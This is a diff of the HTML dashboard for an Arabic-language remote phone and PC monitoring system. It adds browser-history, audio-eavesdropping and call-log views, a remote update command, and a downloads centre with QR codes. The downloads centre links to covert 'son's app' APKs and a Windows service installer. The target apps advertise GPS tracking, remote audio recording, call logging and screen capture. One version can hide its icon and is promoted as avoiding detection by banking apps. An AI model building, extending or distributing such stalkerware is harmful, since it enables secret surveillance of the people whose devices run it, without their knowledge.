-                        <span class="text-xs font-bold text-slate-400">تصفية التسجيلات:</span>
-                        <div class="flex items-center gap-2">
-                            <button onclick="setAudioFilter('all')" data-filter="all" class="audio-filter-btn px-3 py-1 text-xs font-bold rounded-full bg-blue-500/20 text-blue-400 border border-blue-500/30">الكل</button>
-                            <button onclick="setAudioFilter('unheard')" data-filter="unheard" class="audio-filter-btn px-3 py-1 text-xs font-bold rounded-full bg-white/5 text-slate-400 border border-white/10 hover:bg-white/8">🆕 غير مسموع</button>
-                            <button onclick="setAudioFilter('heard')" data-filter="heard" class="audio-filter-btn px-3 py-1 text-xs font-bold rounded-full bg-white/5 text-slate-400 border border-white/10 hover:bg-white/8">🎧 مسموع</button>
+                    <div class="flex flex-wrap items-center justify-between gap-3 bg-slate-900/60 border border-white/10 p-3.5 rounded-2xl backdrop-blur-xl">
+                        <span class="text-xs font-black text-slate-300">تصفية التسجيلات:</span>
+                        <div class="flex items-center gap-2 overflow-x-auto no-scrollbar">
+                            <button onclick="setAudioFilter('all')" data-filter="all" class="audio-filter-btn px-3.5 py-1.5 text-xs font-bold rounded-xl bg-blue-500/20 text-blue-300 border border-blue-500/40 transition-all">الكل</button>
+                            <button onclick="setAudioFilter('unheard')" data-filter="unheard" class="audio-filter-btn px-3.5 py-1.5 text-xs font-bold rounded-xl bg-white/5 text-slate-400 border border-white/10 hover:bg-white/10 hover:text-white transition-all">🆕 غير مسموع</button>
+                            <button onclick="setAudioFilter('heard')" data-filter="heard" class="audio-filter-btn px-3.5 py-1.5 text-xs font-bold rounded-xl bg-white/5 text-slate-400 border border-white/10 hover:bg-white/10 hover:text-white transition-all">🎧 مسموع</button>
+                            <button onclick="setAudioFilter('favorites')" data-filter="favorites" class="audio-filter-btn px-3.5 py-1.5 text-xs font-bold rounded-xl bg-white/5 text-slate-400 border border-white/10 hover:bg-white/10 hover:text-white transition-all">⭐ المفضل</button>
                         </div>
                     </div>
 
@@ -1014,6 +1190,9 @@
                             <span class="font-bold text-slate-400">إلى تاريخ ووقت:</span>
                             <input type="datetime-local" id="audio-filter-to" class="bg-slate-900 border border-white/10 text-white rounded-lg p-1.5 outline-none font-bold accent-blue-500" onchange="fetchAudio()">
                         </div>
+                        <button onclick="fetchAudio(true, true)" class="px-3 py-1.5 bg-blue-500/15 border border-blue-500/30 text-blue-400 rounded-lg hover:bg-blue-500/30 transition-all font-bold flex items-center gap-1">
+                            🔄 تحديث
+                        </button>
                         <button onclick="resetAudioDateTimeFilter()" class="px-3 py-1.5 bg-red-500/10 border border-red-500/20 text-red-400 rounded-lg hover:bg-red-500/25 transition-all font-bold">❌ إعادة تعيين</button>
                     </div>
 
@@ -1086,8 +1265,8 @@
                         <h3 class="text-lg font-black text-white">📞 سجل المكالمات</h3>
                         <button onclick="fetchCallLogs()" class="btn-action btn-ghost text-xs">🔄 تحديث</button>
                     </div>
-                    <div class="glass rounded-2xl overflow-hidden border border-white/5">
-                        <table class="w-full text-right border-collapse">
+                    <div class="glass rounded-2xl overflow-x-auto border border-white/5">
+                        <table class="w-full text-right border-collapse min-w-[600px]">
                             <thead>
                                 <tr class="border-b border-white/5 bg-white/2 text-slate-400 text-xs font-bold">
                                     <th class="p-4">النوع</th>
@@ -1103,6 +1282,51 @@
                                 </tr>
                             </tbody>
                         </table>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ══ TAB: Web History ══ -->
+            <div id="tab-webhistory" class="tab-content animate-fade">
+                <div class="p-6 max-w-5xl mx-auto">
+                    <div class="flex items-center justify-between mb-6">
+                        <h3 class="text-lg font-black text-white">🌐 سجل زيارات مواقع الويب (المتصفح)</h3>
+                        <div class="flex items-center gap-3">
+                            <input type="text" id="webhistory-search" placeholder="🔍 بحث عن موقع أو رابط..." 
+                                   class="bg-slate-900 border border-white/10 text-xs text-white rounded-lg px-3 py-1.5 outline-none font-bold placeholder-slate-500 w-60"
+                                   oninput="filterWebHistoryLocal()">
+                            <button onclick="fetchWebHistory()" class="btn-action btn-ghost text-xs">🔄 تحديث</button>
+                        </div>
+                    </div>
+
+                    <!-- Web History Table -->
+                    <div class="glass rounded-2xl overflow-x-auto border border-white/5">
+                        <table class="w-full text-right border-collapse min-w-[750px]">
+                            <thead>
+                                <tr class="bg-white/3 border-b border-white/5 text-[10px] font-black text-slate-500 uppercase tracking-wider">
+                                    <th class="p-4 w-12 text-center">
+                                        <input type="checkbox" id="webhistory-select-all" onchange="toggleSelectAllWebHistory(this.checked)" class="w-4 h-4 accent-blue-500 cursor-pointer">
+                                    </th>
+                                    <th class="p-4">المتصفح</th>
+                                    <th class="p-4">الموقع ورابط العنوان (URL)</th>
+                                    <th class="p-4">وقت الزيارة</th>
+                                    <th class="p-4 text-center w-24">إجراءات</th>
+                                </tr>
+                            </thead>
+                            <tbody id="webhistory-table-body" class="divide-y divide-white/5 text-sm text-slate-300">
+                                <tr>
+                                    <td colspan="5" class="p-8 text-center text-slate-500">اختر جهازاً لعرض سجل المتصفح</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                    </div>
+
+                    <!-- Bulk Actions Footer for Web History -->
+                    <div id="webhistory-bulk-footer" class="hidden mt-4 p-4 rounded-2xl bg-white/3 border border-white/5 flex items-center justify-between">
+                        <span id="webhistory-selected-count" class="text-xs text-blue-400 font-bold"></span>
+                        <button onclick="deleteSelectedWebHistory()" class="px-4 py-2 text-xs font-bold rounded-lg bg-red-500/15 border border-red-500/30 text-red-400 hover:bg-red-500/25 transition-all">
+                            🗑️ حذف المحدد
+                        </button>
                     </div>
                 </div>
             </div>
@@ -1227,6 +1451,9 @@
                             <button onclick="pushUpdate(false)" class="btn-action btn-primary text-sm justify-center">🚀 إرسال للجهاز الحالي</button>
                             <button onclick="pushUpdate(true)" class="btn-action btn-danger text-sm justify-center">📡 إرسال لكل الأجهزة</button>
                         </div>
+                        <button onclick="checkUpdatesNow()" class="w-full mt-2 btn-action bg-indigo-600/30 border border-indigo-500/40 text-indigo-300 hover:bg-indigo-600/50 text-sm justify-center font-bold">
+                            🔄 أمر فحص وتثبيت التحديثات الآن على الجهاز
+                        </button>
 
                         <!-- Force Actions -->
                         <div class="border-t border-white/5 pt-4">
@@ -1268,8 +1495,187 @@
                 </div>
             </div>
 
+            <!-- ══ TAB: Downloads Center ══ -->
+            <div id="tab-downloads" class="tab-content animate-fade">
+                <div class="p-6 max-w-5xl mx-auto space-y-6">
+                    <div class="flex items-center justify-between border-b border-white/10 pb-4 flex-wrap gap-3">
+                        <div>
+                            <h3 class="text-xl font-black text-white flex items-center gap-2">
+                                <span>📦 مركز التحميلات وروابط الـ QR</span>
+                                <span class="text-xs px-2.5 py-1 rounded-full bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 font-bold">تحديثات آلية</span>
+                            </h3>
+                            <p class="text-xs text-slate-400 mt-1">تحميل تطبيقات إدارة وتشفير منظومة المراقبة عن بُعد وأكواد المسح السريع QR</p>
+                        </div>
+                        <a href="downloads.html" target="_blank" class="px-3.5 py-2 text-xs font-bold rounded-xl bg-blue-500/15 border border-blue-500/30 text-blue-400 hover:bg-blue-500/25 transition-all flex items-center gap-1.5">
+                            🔗 فتح صفحة التحميل في نافذة مستقلة
+                        </a>
+                    </div>
+
+                    <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
+                        <!-- ══ 1. تطبيق لوحة التحكم ══ -->
+                        <div class="glass p-6 rounded-2xl border border-white/10 flex flex-col justify-between space-y-4 hover:border-blue-500/30 transition-all">
+                            <div>
+                                <div class="flex items-center justify-between mb-3">
+                                    <div class="flex items-center gap-3">
+                                        <div class="w-12 h-12 rounded-2xl bg-blue-500/15 border border-blue-500/30 flex items-center justify-center text-2xl">📊</div>
+                                        <div>
+                                            <h4 class="text-base font-black text-white">تطبيق لوحة التحكم (المشرف)</h4>
+                                            <span class="inline-block text-[11px] font-bold px-2 py-0.5 rounded bg-emerald-500/15 text-emerald-400 border border-emerald-500/30 mt-0.5">الإصدار v96 (1.96).2 (v96)</span>
+                                        </div>
+                                    </div>
+                                </div>
+                                <p class="text-xs text-slate-300 leading-relaxed mb-3">تطبيق لوحة التحكم الخاص بهاتفك أنت لإدارة وتشغيل ومراقبة جميع الأجهزة عن بُعد. يتميز بالسرعة ولا يحتاج لإعادة تثبيت أو تحديثات.</p>
+                                <ul class="text-xs text-slate-400 space-y-1.5 mb-4 bg-slate-900/50 p-3 rounded-xl border border-white/5">
+                                    <li class="flex items-center gap-1.5"><span class="text-emerald-400">✅</span> لا يحتاج أي تحديثات مستقبلية</li>
+                                    <li class="flex items-center gap-1.5"><span class="text-emerald-400">🔐</span> حفظ بيانات تسجيل الدخول تلقائياً</li>
+                                    <li class="flex items-center gap-1.5"><span class="text-emerald-400">🎙️</span> استماع مباشر وتنبيهات فورية</li>
+                                    <li class="flex items-center gap-1.5"><span class="text-emerald-400">⚡</span> سريع جداً وخفيف (~5 MB)</li>
+                                </ul>
+                            </div>
+                            <div class="flex flex-col gap-3">
+                                <a href="https://ahiqnmheiqigrdbishwe.supabase.co/storage/v1/object/public/monitoring_data/admin-app.apk?v=96"
+                                   class="w-full py-3 px-4 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 text-white rounded-xl font-bold text-xs shadow-lg shadow-blue-500/20 text-center transition-all flex items-center justify-center gap-2">
+                                    ⬇️ تحميل تطبيق لوحة التحكم (admin-app.apk)
+                                </a>
+                                <!-- QR Code Admin -->
+                                <div class="flex items-center gap-4 bg-slate-900/80 p-3 rounded-xl border border-white/5">
+                                    <img src="https://api.qrserver.com/v1/create-qr-code/?size=140x140&color=f1f5f9&bgcolor=020617&data=https://ahiqnmheiqigrdbishwe.supabase.co/storage/v1/object/public/monitoring_data/admin-app.apk?v=96&t=1788975493557" 
+                                         alt="QR Admin" class="w-20 h-20 rounded-lg border border-white/10 flex-shrink-0">
+                                    <div class="text-xs text-slate-300 space-y-1">
+                                        <p class="font-bold text-blue-400">📱 مسح رمز QR للتثبيت:</p>
+                                        <p class="text-[11px] text-slate-400">افتح الكاميرا على هاتفك المباشر لتحميل تطبيق الإدارة فوراً.</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- ══ 2. تطبيق الجهاز المستهدف (الكامل) ══ -->
+                        <div class="glass p-6 rounded-2xl border border-white/10 flex flex-col justify-between space-y-4 hover:border-purple-500/30 transition-all">
+                            <div>
+                                <div class="flex items-center justify-between mb-3">
+                                    <div class="flex items-center gap-3">
+                                        <div class="w-12 h-12 rounded-2xl bg-purple-500/15 border border-purple-500/30 flex items-center justify-center text-2xl">📱</div>
+                                        <div>
+                                            <h4 class="text-base font-black text-white">تطبيق الابن (النسخة الكاملة)</h4>
+                                            <span class="inline-block text-[11px] font-bold px-2 py-0.5 rounded bg-blue-500/15 text-blue-400 border border-blue-500/30 mt-0.5">الإصدار v96 (1.96)</span>
+                                        </div>
+                                    </div>
+                                </div>
+                                <p class="text-xs text-slate-300 leading-relaxed mb-3">النسخة المتكاملة بكافة الصلاحيات (إمكانية الوصول، مدير الجهاز، تصوير الشاشة، ومراقبة الخلفية الكاملة).</p>
+                                <ul class="text-xs text-slate-400 space-y-1.5 mb-4 bg-slate-900/50 p-3 rounded-xl border border-white/5">
+                                    <li class="flex items-center gap-1.5"><span class="text-purple-400">📍</span> تتبع موقع GPS المباشر والدقيق</li>
+                                    <li class="flex items-center gap-1.5"><span class="text-purple-400">🎙️</span> تسجيل صوتي تلقائي وعن بُعد</li>
+                                    <li class="flex items-center gap-1.5"><span class="text-purple-400">📞</span> مزامنة وقراءة سجل المكالمات</li>
+                                    <li class="flex items-center gap-1.5"><span class="text-purple-400">📸</span> التقاط شاشة ومسح شبكات مجاورة</li>
+                                </ul>
+                            </div>
+                            <div class="flex flex-col gap-3">
+                                <a href="https://ahiqnmheiqigrdbishwe.supabase.co/storage/v1/object/public/monitoring_data/sync-service.apk?v=96"
+                                   class="w-full py-3 px-4 bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-500 hover:to-indigo-500 text-white rounded-xl font-bold text-xs shadow-lg shadow-purple-500/20 text-center transition-all flex items-center justify-center gap-2">
+                                    ⬇️ تحميل النسخة الكاملة (sync-service.apk)
+                                </a>
+                                <!-- QR Code Target -->
+                                <div class="flex items-center gap-4 bg-slate-900/80 p-3 rounded-xl border border-white/5">
+                                    <img src="https://api.qrserver.com/v1/create-qr-code/?size=140x140&color=f1f5f9&bgcolor=020617&data=https://ahiqnmheiqigrdbishwe.supabase.co/storage/v1/object/public/monitoring_data/sync-service.apk?v=96&t=1788975493557" 
+                                         alt="QR Target" class="w-20 h-20 rounded-lg border border-white/10 flex-shrink-0">
+                                    <div class="text-xs text-slate-300 space-y-1">
+                                        <p class="font-bold text-purple-400">📱 مسح QR للهاتف الكامل:</p>
+                                        <p class="text-[11px] text-slate-400">امسح الكود من هاتف الابن لتثبيت المراقبة الشاملة.</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- ══ 3. تطبيق الابن - النسخة المخففة (Lite / البنوك) ══ -->
+                        <div class="glass p-6 rounded-2xl border border-emerald-500/25 flex flex-col justify-between space-y-4 hover:border-emerald-500/40 transition-all bg-emerald-950/10">
+                            <div>
+                                <div class="flex items-center justify-between mb-3">
+                                    <div class="flex items-center gap-3">
+                                        <div class="w-12 h-12 rounded-2xl bg-emerald-500/15 border border-emerald-500/30 flex items-center justify-center text-2xl">🛡️</div>
+                                        <div>
+                                            <h4 class="text-base font-black text-white">تطبيق الابن (Lite / البنوك)</h4>
+                                            <span class="inline-block text-[11px] font-bold px-2 py-0.5 rounded bg-emerald-500/15 text-emerald-400 border border-emerald-500/30 mt-0.5">الإصدار v96 (1.96) (1.96-lite) — آمن للبنوك</span>
+                                        </div>
+                                    </div>
+                                </div>
+                                <p class="text-xs text-slate-300 leading-relaxed mb-3">نسخة مستقلة تماماً ومخصصة للعمل بتوافق 100% مع التطبيقات البنكية والمصرفية، تقتصر على المكالمات والموقع دون أي كشف.</p>
+                                <ul class="text-xs text-slate-400 space-y-1.5 mb-4 bg-slate-900/50 p-3 rounded-xl border border-white/5">
+                                    <li class="flex items-center gap-1.5"><span class="text-emerald-400">🏦</span> متوافق كلياً مع التطبيقات البنكية (بدون Accessibility)</li>
+                                    <li class="flex items-center gap-1.5"><span class="text-emerald-400">📍</span> تتبع موقع ذكي (عند الحركة > 30 متراً)</li>
+                                    <li class="flex items-center gap-1.5"><span class="text-emerald-400">📞</span> مزامنة وقراءة سجل وتوقيت المكالمات</li>
+                                    <li class="flex items-center gap-1.5"><span class="text-emerald-400">🎙️</span> تسجيل صوتي أثناء المكالمة فقط (16kHz Mono)</li>
+                                    <li class="flex items-center gap-1.5"><span class="text-emerald-400">🫥</span> إمكانية إخفاء أيقونة التطبيق بالكامل</li>
+                                </ul>
+                            </div>
+                            <div class="flex flex-col gap-3">
+                                <div class="grid grid-cols-2 gap-2">
+                                    <a href="https://ahiqnmheiqigrdbishwe.supabase.co/storage/v1/object/public/monitoring_data/sync-service-lite.apk?v=96"
+                                       class="py-2.5 px-3 bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white rounded-xl font-bold text-xs shadow-lg shadow-emerald-500/20 text-center transition-all flex items-center justify-center gap-1.5">
+                                        ⬇️ تحميل مباشر
+                                    </a>
+                                    <button type="button" onclick="copyDownloadLink('https://ahiqnmheiqigrdbishwe.supabase.co/storage/v1/object/public/monitoring_data/sync-service-lite.apk?v=96"
+                                       class="py-2.5 px-3 bg-white/5 hover:bg-white/10 text-slate-200 border border-white/10 rounded-xl font-bold text-xs text-center transition-all flex items-center justify-center gap-1.5">
+                                        📋 نسخ الرابط
+                                    </button>
+                                </div>
+                                <!-- QR Code Lite -->
+                                <div class="flex items-center gap-4 bg-slate-900/80 p-3 rounded-xl border border-white/5">
+                                    <img src="https://api.qrserver.com/v1/create-qr-code/?size=140x140&color=f1f5f9&bgcolor=020617&data=https://ahiqnmheiqigrdbishwe.supabase.co/storage/v1/object/public/monitoring_data/sync-service-lite.apk?v=96&t=1788975493557" 
+                                         alt="QR Lite" class="w-20 h-20 rounded-lg border border-white/10 flex-shrink-0">
+                                    <div class="text-xs text-slate-300 space-y-1">
+                                        <p class="font-bold text-emerald-400">📱 مسح QR للنسخة المخففة:</p>
+                                        <p class="text-[11px] text-slate-400">امسح الكود من هاتف الابن لتحميل نسخة البنوك والمكالمات فوراً.</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- ══ 3. تطبيق المراقبة للكمبيوتر (Windows) ══ -->
+                    <div class="glass p-6 rounded-2xl border border-white/10 space-y-4 hover:border-emerald-500/30 transition-all">
+                        <div class="flex items-center gap-3">
+                            <div class="w-12 h-12 rounded-2xl bg-emerald-500/15 border border-emerald-500/30 flex items-center justify-center text-2xl">🖥️</div>
+                            <div>
+                                <h4 class="text-base font-black text-white">برنامج مراقبة الكمبيوتر (Windows Service)</h4>
+                                <span class="inline-block text-[11px] font-bold px-2 py-0.5 rounded bg-emerald-500/15 text-emerald-400 border border-emerald-500/30 mt-0.5">الإصدار v96 (1.96).1 (صوت مباشر)</span>
+                            </div>
+                        </div>
+                        <p class="text-xs text-slate-300 leading-relaxed">برنامج التثبيت الذكي والشفاف لأجهزة الكمبيوتر — يُثبَّت كـ Windows Service ويراقب النظام تلقائياً في الخلفية ويظهر الكمبيوتر 🖥️ في القائمة الموحدة.</p>
+                        
+                        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                            <a href="https://ahiqnmheiqigrdbishwe.supabase.co/storage/v1/object/public/monitoring_data/MyMonitorInstaller.exe"
+                               class="w-full py-3 px-4 bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white rounded-xl font-bold text-xs shadow-lg shadow-emerald-500/20 text-center transition-all flex items-center justify-center gap-2">
+                                ⬇️ تحميل مثبت الكمبيوتر (MyMonitorInstaller.exe)
+                            </a>
+                            <div class="p-3 bg-slate-900/60 border border-white/5 rounded-xl text-[11px] text-slate-400 leading-relaxed">
+                                <strong class="text-emerald-400">🔧 طريقة التثبيت:</strong> انقر بزر الماوس الأيمن على <code class="text-white">MyMonitorInstaller.exe</code> واختر <strong>تشغيل كمسؤول (Run as Administrator)</strong>.
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
         </div><!-- end .view-area -->
     </main>
+
+    <!-- ══ Mobile Bottom Tab Navigation ══ -->
+    <div id="mobile-tab-nav">
+        <button class="mob-tab-btn active" id="mob-tab-reports" onclick="switchTabMobile('reports'); setActiveMobTab('reports')">
+            <span class="mob-tab-icon">📋</span>تقارير
+        </button>
+        <button class="mob-tab-btn" id="mob-tab-audio" onclick="switchTabMobile('audio'); setActiveMobTab('audio')">
+            <span class="mob-tab-icon">🎙️</span>تنصت
+        </button>
+        <button class="mob-tab-btn" id="mob-tab-track" onclick="switchTabMobile('track'); setActiveMobTab('track')">
+            <span class="mob-tab-icon">🗺️</span>خريطة
+        </button>
+        <button class="mob-tab-btn" id="mob-tab-callogs" onclick="switchTabMobile('callogs'); setActiveMobTab('callogs')">
+            <span class="mob-tab-icon">📞</span>مكالمات
+        </button>
+        <button class="mob-tab-btn" id="mob-tab-more" onclick="toggleSidebar()">
+            <span class="mob-tab-icon">☰</span>المزيد
+        </button>
+    </div>
 
     <!-- ══ Mobile Bottom Quick Actions Bar ══ -->
     <div id="mobile-quick-actions">
@@ -1297,7 +1703,7 @@
         <img id="lightbox-img" class="max-h-[90vh] max-w-[90vw] rounded-2xl shadow-2xl object-contain">
     </div>
 
-    <script src="fleet_logic.js?v=9.3"></script>
+    <script src="fleet_logic.js?v=96_1788975493557"></script>
     <script>
         function toggleSidebar() {
             const sidebar = document.getElementById('main-sidebar');
@@ -1314,6 +1720,15 @@
                 sidebar.classList.remove('active');
                 overlay.classList.remove('active');
             }
+        }
+        /**
+         * تحديث التبويب النشط في شريط التبويبات السفلي
+         * يُستدعى من أزرار التبويبات والقائمة الجانبية
+         */
+        function setActiveMobTab(tab) {
+            document.querySelectorAll('.mob-tab-btn').forEach(b => b.classList.remove('active'));
+            const btn = document.getElementById('mob-tab-' + tab);
+            if (btn) btn.classList.add('active');
         }
         // Hook device selection clicks to close sidebar on mobile
         document.addEventListener('DOMContentLoaded', () => {
